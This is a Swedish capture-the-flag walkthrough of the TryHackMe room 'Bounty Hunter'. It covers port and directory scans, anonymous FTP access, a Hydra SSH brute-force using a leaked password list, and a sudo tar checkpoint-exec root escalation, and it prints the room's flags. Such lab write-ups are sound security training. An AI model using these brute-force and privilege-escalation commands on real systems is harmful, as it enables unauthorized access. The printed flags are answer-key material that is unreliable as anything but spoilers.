# Bounty Hunter

## Enumeration

### nmap scan
Jag började med en full port scan för att hitta alla öppna portar
```bash
nmap -p- 10.113.189.52
```
Resultat
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
### HTTP(80)
Startsidan verkar endast vara lore för boxen, endast en pdf med text

Jag använde sedan gobuster för att försöka hitta gömda directories.
```bash
gobuster dir -u http://10.113.189.52 -w /usr/share/wordlists/dirb/common.txt
```
```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://10.113.189.52/images/]
/index.html           (Status: 200) [Size: 969]
/javascript           (Status: 301) [Size: 319] [--> http://10.113.189.52/javascript/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
/javascript ledde endast till en 403 Forbidden. Så inget av detta ledde någonstans av värde.
### FTP(21)
FTP tillät anonym inloggning.
Inuti FTP servern hittade jag 2 filer
```
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```
Båda filerna laddade jag ner för att analysera.
```
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (891.2732 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (349.5066 kB/s)
```
task.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
Detta visar ett potentiellt användarnamn: lin, som kan användas vid SSH inloggning.

locks.txt
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
Filen verkar innehålla olika lösenord, troligtvis tänkt för en bruteforce attack.

## Initial Access

Jag använde Hydra för att testa SSH-inloggning för användaren lin.

```bash
hydra -l lin -P locks.txt 10.113.189.52 ssh
```
Resultat
```
[DATA] attacking ssh://10.113.189.52:22/
[22][ssh] host: 10.113.189.52   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```
Vi hittade ett giltigt lösenord

Väl inne i lin/Desktop så hittade jag user.txt

```
THM{CR1M3_SyNd1C4T3}
```

## Privilege Escalation

Börjar med att se vad jag kan köra med sudo
```bash
sudo -l
```
Resultat
```
User lin may run the following commands on ip-10-113-189-52:
    (root) /bin/tar
```
Detta visar att vi kan köra /bin/tar som root. 

Jag använde då detta kommando som lätt gick att hitta på GTFObins
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Vad detta gör är att utnyttja att tar kan köra kommandon vid checkpoints och får den att skapa ett shell som då blir root.

Jag verifierade sedan mina privilegier med whoami för att se ifall kommandot funkade.

```
# whoami
root
```
I /root hittade jag root.txt

```
THM{80UN7Y_h4cK3r}
```
## Länk till boxen
https://tryhackme.com/room/cowboyhacker
